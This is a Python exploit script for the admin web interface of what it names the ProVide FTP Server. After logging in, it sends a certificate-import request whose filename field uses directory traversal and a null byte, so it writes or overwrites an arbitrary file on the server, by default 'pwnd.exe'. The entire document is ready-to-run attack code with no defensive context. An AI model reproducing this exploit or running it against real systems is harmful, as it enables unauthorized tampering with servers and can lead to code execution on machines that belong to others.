# Admin Interface Arbitrary File Overwrite

import argparse
import ipaddress
import os
import subprocess
import sys
import time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def proxy(flag):
    return {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if flag else None


def get_url(target, path=None):
    url = f"https://{target}:8443"
    if path:
        if not path.startswith("/"):
            path = f"/{path}"
    else:
        path = ""
    return f"{url}{path}"


def get_headers():
    return {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"
            }


def login(target, user, password, proxy_host=None):
    data = {"username": user, "password": password, "logon": ''}
    res = requests.post(get_url(target), headers=get_headers(), data=data, proxies=proxy_host, allow_redirects=False,
                        verify=False)
    return res.cookies


def create_file(target, cookies, filename, proxy_host):
    url = get_url(target, "/ajax/ImportCertificate")
    template = (
	"fileName=../../../../{}%00&file=data%3Aapplication%2Fx-x509-ca-cert%3"
	"Bbase64%2CMIIDyTCCArGgAwIBAgIEVHsxyzANBgkqhkiG9w0BAQsFADCBijEUMBIGA1UEBhMLU"
	"G9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEU"
	"MBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5"
	"Qb3J0U3dpZ2dlciBDQTAeFw0xNDExMzAxNTAzMzlaFw0zOTExMzAxNTAzMalaMIGKMRQwEgYDVQ"
	"QGEwtQb3J0U3dpZ2dlcjEUMBIGA1UECBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ"
	"2VyMRQwEgYDVQQKEwtQb3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNV"
	"BAMTDlBvcnRTd2lnZ2VyIENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoPUanhD"
	"lJArEXn%2FYB1kSiYKrTCoeUcLVV69BssCrQGz%2Bv%2FIa9j%2FZ0UiEJw4FghyrpcVRuyVCHi"
	"QOK9%2BxeEn941v1l3AZS77CI1IZCX55PogrOM3Kr6G%2FCfe6yzCLu%2BQzHGPkZ6OXtLrx7pN"
	"WudU7kurkX9DiJXJE%2BnrbDECgezhib%2FHnyJDkHB1W1IF5T0t2jINBrHcSMuE3eTUKPMzwkd"
	"ZoJPgdM9O%2FrdHyf6oRqNnr4mR7FI97EM%2B3Au1%2BijFON5iXyx7is8JnS0OrsCQrDVgX%2F"
	"eMJYHGASO95blE49aPFfXN8ma2MUAzd6HL8fYtej2AO%2BtU5HPLyPuv1ORgOXQIDAQABozUwMz"
	"ASBgNVHRMBAf8ECDAGAQH%2FAgEAMB0GA1UdDgQWBBQiU6N1ce7ixYUJQmAI2jVmPfBZXTANBgk"
	"qhkiG9w0BAQsFAAOCAQEAF8c7Vkk4BHnolMx1y7GqF8xkOSTYXzxcl5%2B8uDDTXxho6X6WSQAM"
	"QZMr%2BONav289FhzhRyA3cIK1j44mAgAEKeWE1FsUNDiNo8JQKfDRj%2FWPlrF411bR3E2k028"
	"kyZTxkB78yNfEUQ0T4CMKkFw9c%2B%2Btyw1iL47aWCgYVJ%2BHDzshd4hpw2jgubkcYa%2FhBu"
	"lwnFWgI%2FyQdaD2UHxjAJFsjwXFzqk9oSVSQyvp5OyrtWYGSuMCiikFNDylKhwtoeTe1p524we"
	"tETow1SBqlfzhgVijxM259N6h7bF%2BFs8r6VrwZ33h3cT30%2BvLOi4ALpHH3yXl1fosYTwqor"
	"5QuhhvXw%3D%3D&privateKey=data%3Aapplication%2Fx-x509-ca-cert%3Bbase64%2CMI"
	"IKawIBAzCCCiQGCSqGSIb3DQEHAaCCChUEggoRMIIKDTCCBWkGCSqGSIb3DQEHAaCCBVoEggVWM"
	"IIFUjCCBU4GCyqGSIb3DQEMCgECoIIE%2BzCCBPcwKQYKKoZIhvcNAQwBAzAbBBTFhTUxtRHNUJ"
	"1UPFp8HgOmszfnyQIDAMNQBIIEyOskNqM%2FCeC7FHFexN%2B25O863ZBJFnZ834B3dAipfGml9"
	"g97VWekry3kxnpTSZHQ%2Blc1hKNAyrJP8q84u8Dfa3cSPnDAZJo34BJudxAjEVHAc0jAvIzkSt"
	"3CUtiGGNhcLoJdRdrwxeSJjgAQoEQP3bI1hmQ3PFJ8hESMeUxIP%2Bm0dFDMqKoCzvlWzj2nnsY"
	"wjGmq3A5fbZgbFYUSs1AFzEjDHwYOMJbg%2FwLzIAdm%2BDAhAi9NyE11fB795SxI1e4ShNlkOs"
	"GT7KSqVhb6Nxl%2BrpCSa8qdnEWGMO4Qm15dO8j%2BByzrGCRCJ40ch5O%2FTQCI1WQc0PSiyQv"
	"CixJ4UInGjtti9xVkp1V7v4d79wrMlsfRB8wrw8ETGZnREQgfEbeqPQbANq9e3XkdFDZwTZzIhE"
	"FFR5DzVsUZk5hJSBMl9FfyVVUotF4PO5KNZC9QLsv0qnKoCCD06S9agXgpwo%2BjaXyOe1JzuKI"
	"GpyRzWl8%2BMPngH2qBwGKDA88aA7blW2McIV19aqLPGMy1He93etftPEgPSDw81H%2BkrDbBRA"
	"TmKZsoz3Gzi8PAH%2Bqwz7HqrCFNoSO98tZZS%2FhVekJs1nGQ%2Ft4q7aHxN0ZwbcVD%2BeZB2"
	"80KH2ZwW6Yu59XhGsuFTxFfU%2FoS3womM0PfXV7rNkGRJ4L%2BLrgLzqmCBWxbC4zgbgZoCvpH"
	"afUUmVPfwsyFIe9U2%2FXRIZezT62O8XCUAXhrxStjb%2BYHSdhdOC%2BiiOwzRqMjuZ8lybTdl"
	"EgYrycJo%2BBWZdL3EQH0IiEIclJi3lfMK97BF%2FM1TORs%2FmRDsLTnO6LBprm7pQL4x8%2BR"
	"Bz3AscOs%2BvxGHH0EIDUKCVPPrQCyKCmSPdab89W9B9IhvytsPdGKY%2BVzxIokFgYIa6RQzr6"
	"XBmIbFu6MJmXPwLZuATYkPWMyHV5%2BVuuZsAZgKtzGxjyPD4BmHVaSD5y%2FcCqVTowy3VdjxE"
	"%2BN5KDpvjwIYb9YaStnP3QfZHNtlSi1xnP353tkFJGYFcV7yjfbdEUK3UMfupd4xj3pTXiQKNn"
	"4Jg2CQ%2FmOY3%2BNzNrd1rBakm03QZxaY8lXo9nqIrAjFR2s4qg6oCg3hN5KbxU6%2BP0BHpZS"
	"OKwKSoyXM74p%2Fy7ernB%2FqmAE1jebE5WJvSHbMF%2FWfdtsZNaID5tcbniNGQKHRlQn1J%2F"
	"oDTNycat1rpa3nx72bwxuNakSjl%2BuVfRskT4i7kB%2B216tTk8jZfwikHzz4iT0ualSgcUhod"
	"Dd4DZ6sPkyxs2wfd0U5xD%2BPjpthDMgugQQz2mcjRyD9gowkd9Z7TAExCObeIyHuSfAMoSICAg"
	"upjJ8z%2Fwr%2FX5TjoQRwDx%2FgdTiF7wpIcHDr9UJFmBn8bu3XbW9wRcQRPQaIkAq3vOd%2Fc"
	"H%2B7EQpvLs0cg5Ps5eKrRZ9jikGsEuIbLwyG%2BNQBWCsEWi1tHf7E2EK5K2n%2FD99HwZYmhz"
	"q3QQzU5Seg932Lauxy5y0NL6tpUuKOHjQIwRe5FgoDwYo4OWA2AnxJu%2FPJhUju33gCO0ueihq"
	"Ng0cBzNk%2B9At3tiDTkMwa2j8ixY0lhj535jwuDet5zyT%2B9JAcWQi3Gv428CBJv%2BrMrM0q"
	"Wh5Zykh4Umqk9AFGsHxikMS2MH4TT9Hv6YrXzFAMBsGCSqGSIb3DQEJFDEOHgwAYwBhAGMAZQBy"
	"AHQwIQYJKoZIhvcNAQkVMRQEElRpbWUgMTU4NjE3NzIzNzY4NjCCBJwGCSqGSIb3DQEHBqCCBI0"
	"wggSJAgEAMIIEggYJKoZIhvcNAQcBMCkGCiqGSIb3DQEMAQYwGwQUr8SnF8euYPsz6K4tyHkfaS"
	"Jau54CAwDDUICCBEjvMd3Wn2aJJwO4N2IfZY498x2QTpNSDY6Ji7qXxYGhbThenZhkCBtaoV%2B"
	"TEXGjKfG0%2F9%2FhpauA9NZ6Ny%2F4cGJ2kpcWjS8Wj9f22NzKWQdH89bhRbs%2FiAPSEO3JQ7"
	"DGGGCbe6I76KEyD1dELF2ZgkaM79%2FCqmfXfYW1Yw37qdut5IMTXp4W9j0csV77C6%2FaVztAx"
	"WdJbo9Rs32wxbHItSkSLdEVa9hbJm179UlzhJBxC5DqkPv6%2B%2F2K1YBabhgf7V7vq519WcSh"
	"Z%2FhGfORFLwSNkwMEVx%2BRjAnBmx%2BoeC4nES75fipiA2R3%2BOMSqHuoUdyEuF7IA%2Bm35"
	"WsXdSxmBXsPuHVPreBDZClJFYZ896CPtD%2FDqPQIr%2FhxsEfn2nhowyXn0EJ4GyMYgVMEE1o1"
	"IjT6Df%2FeFuHajx4HfkdZnOYX9RBtJo%2FYJQOCtcCdVOy18aMOaofkXq%2Bg5ed3BZIY7kLe3"
	"WUBRuiYmwPr0bK8IVDfj0PYPVTRdDosfV35Y6ov7VtdiorUDt9Wqx4%2FXIZXe%2Fzq6n0j5sDZ"
	"b5mpjslpAFwPB5FdkZd%2BXcKPms2yWd9zojPww5AcfzaDDUd0m7O0E5pqgk5JapxsU9fMuUX0O"
	"FNRWk%2BimDoikCG125fuho%2BF1A5q2N8j0SNucLpKU%2BoYqwqj1Ka0in0WSPMkBKuTgvnklF"
	"F0kkEcOD53bqU425OimJzs4xn7mXVq2PGVFN9eeBdhRtw9DBkjpOuNo10z8WKSbJHYjYsdpKrrB"
	"8kMJKMzzaJHO%2FKVn5eIhfejKqCS%2BNLxJJQ8bppgjsKv0tLwbgD1fjGYHuWaGtgQOJ365NuQ"
	"%2BrQluQp%2FInuM6YeviLLPu2B2NtuzFgv63uBCdTjOfj7W9YSPKHqHN%2FCV%2FgQzOTkzT6Y"
	"fddNsho5371tOAiXl6QozhxgFrzF1Biv%2BAsEgkiZZiAExnkHcdzpQIYIX8HJFttxkgibZyaLx"
	"kd6iQNiA4ddS53WG9EgRbnm3aZzvgPZVwPCval%2FWNPe11o7pNWWqy6jAwWxRFPlLCKFfK0d24"
	"bwkRAxWizKavOvJLTJEUGcPBi6MUGvPvS74iGvWlOZvXOaN790hzrOpLX1RdqdzEOhDKaYpqXy4"
	"pQ4AxfVfXvVqsxlfDgaB0L%2FAzrQlIsc1Pg9NpvcO%2Bu%2Fv%2B%2BXF2BX368C5NcPpcYaqb"
	"TbbFidSLMjyYpPRqI1wbbG83y5DL50rZ8D1vG8YJhIT3tpDV6%2FJ4c9%2FkYstV9tgKNfrE0vB"
	"AvLchDOdZv6cCxmz%2FP1bJR8iV7Ms7vGBQXlLh7YYjXhyQSMiwykJEsxy%2B67VQp4BAIV7qZe"
	"RVdVXoQX7A2kOJkdxM3MiP9fYMaV7SfEzLolmAX1xPpQQgNZMazA6xx8xxmxpsiJ8Us41o7X75e"
	"BXFSLRfl1wtOqfPoSM8UdRDBYiFOF3p%2FCrwQBNnk3Fqqvp1Qbh%2F4WRRaFVwsgKMD4wITAJB"
	"gUrDgMCGgUABBRFN%2BxxPYwV3rX%2FWavcBMHTadpZsgQUYMBtpgWesc0s9c2UONzYgfXRC9oC"
	"AwGGoA%3D%3D&privateKeyPassword=burp")
    data = template.format(filename)
    res = requests.post(url, headers=get_headers(), cookies=cookies, data=data, proxies=proxy_host, allow_redirects=False,
                        verify=False)
    return res.status_code == 200

def exploit(target, user, password, filename, proxy_host):
    print("[+] Logging in")
    cookies = login(target, user, password, proxy_host)
    if not cookies:
        print("[-] Could not login. Aborting.")
        sys.exit(1)
    time.sleep(2)
    print(f"[+] Creating C:\{filename} File")
    create_file(target, cookies, filename, proxy_host)
    print("Done! Check the filesystem!")
    
def validate_ip(target):
    try:
        ipaddress.ip_address(target)
        return True
    except ValueError:
        return False


def main():
    parser = argparse.ArgumentParser(description='ProVide FTP Server Exploit - Path Traversal to corrupt/create a file')

    parser.add_argument(
        '-u', '--user', required=False, type=str, help='Username')
    parser.add_argument(
        '-p', '--password', required=False, type=str, help='Hashed Password')
    parser.add_argument(
        '-x', '--proxy', required=False, action="store_true", help='Proxy (for debugging)')
    parser.add_argument(
        '-d', '--debug', required=False, action="store_true", help='Enable debug output')
    parser.add_argument(
        '-f', '--file', required=False, type=str, default="pwnd.exe", help='Evil filename')
    parser.add_argument(
        '-t', '--target', required=True, type=str, default=None, help='Target Base URL')

    args = parser.parse_args()

    if validate_ip(args.target):
        exploit(args.target, args.user, args.password, args.file, proxy(args.proxy))
    else:
        print("[-] Invalid Target IP")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    main()
